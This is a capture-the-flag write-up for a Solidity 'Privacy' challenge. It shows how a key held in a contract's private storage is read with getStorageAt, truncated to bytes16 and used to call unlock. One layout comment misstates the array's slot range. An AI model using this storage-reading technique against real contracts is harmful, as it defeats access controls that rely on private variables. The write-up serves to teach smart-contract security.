# Challenge 12

<img src="./images/BigLevel12.svg" alt="12" >

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Privacy {

  bool public locked = true;
  uint256 public ID = block.timestamp;
  uint8 private flattening = 10;
  uint8 private denomination = 255;
  uint16 private awkwardness = uint16(block.timestamp);
  bytes32[3] private data;

  constructor(bytes32[3] memory _data) {
    data = _data;
  }
  
  function unlock(bytes16 _key) public {
    require(_key == bytes16(data[2]));
    locked = false;
  }

  /*
    A bunch of super advanced solidity algorithms...

      ,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`
      .,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,
      *.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^         ,---/V\
      `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.    ~|__(o.o)
      ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'  UU  UU
  */
}
```

Challenge
---
> The creator of this contract was careful enough to protect the sensitive areas of its storage.

  Unlock this contract to beat the level.

  Things that might help:

  - Understanding how storage works
  - Understanding how parameter parsing works
  - Understanding how casting works
  
  Tips:

  Remember that metamask is just a commodity. Use another tool if it is presenting problems. Advanced gameplay could involve using remix, or your own web3 provider.

Solution 
---

1. Here's The Gotcha My Fellow Friends if you know how evm store the data and how to do type conversion then you will beat this challenge. Let's Look at the Code.

```solidity
  bool public locked = true;
  uint256 public ID = block.timestamp;
  uint8 private flattening = 10;
  uint8 private denomination = 255;
  uint16 private awkwardness = uint16(block.timestamp);
  bytes32[3] private data;

  constructor(bytes32[3] memory _data) {
    data = _data;
  }
  
  function unlock(bytes16 _key) public {
    require(_key == bytes16(data[2]));
    locked = false;
  }
```
here we need is `byte16 key` and the stored key is in `bytes32` but before that you need to know in which slot our key is stored.
Here Take a look at this. Remember our storage is `32 byte` for `each slot`.
```solidity
  bool public locked = true; // 1 byte -> slot 0
  uint256 public ID = block.timestamp; // 32 bytes -> slot 1
  uint8 private flattening = 10; // 1 byte -> slot 2
  uint8 private denomination = 255; // 1 byte -> slot 2
  uint16 private awkwardness = uint16(block.timestamp); // 2 byte -> 2
  bytes32[3] private data; // 32 byte -> 3,4,5,6 fixed size array
```

Phew! Let's get the key when we got our instance `data` already deployed with we just need to convert it `bytes16` let's open the terminal and get the data at `index 2` which means at `slot 5`.

hope in the terminal 
```js
await web3.eth.getStorageAt("YOUR_INSTANCE_ADDRESS",5) // instance address, slot number
```

now you will see this bytes32 key `0x530cbffbcfe0ebbdc13e274dfa14b5ea78b94a2091f11117ecefeba0410fc499`
 
but we need bytes16 for that wehen we convert bytes32 to bytes16 we remove 16 bytes (32 digits) from the right.

```js
"0x530cbffbcfe0ebbdc13e274dfa14b5ea78b94a2091f11117ecefeba0410fc499".slice(0,34)
```

for slice method in js here's the [link.](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/slice)

now it will give you this `0x530cbffbcfe0ebbdc13e274dfa14b5ea`. copy this and call the unlock.

```js
await contract.unlock("0x530cbffbcfe0ebbdc13e274dfa14b5ea")
```

now to check if it's true or not 
```js
await contract.locked()
```
it will became false bec we Successfully unlock the function with `bytes16 key`. now submit the instance your challenge will be cleared.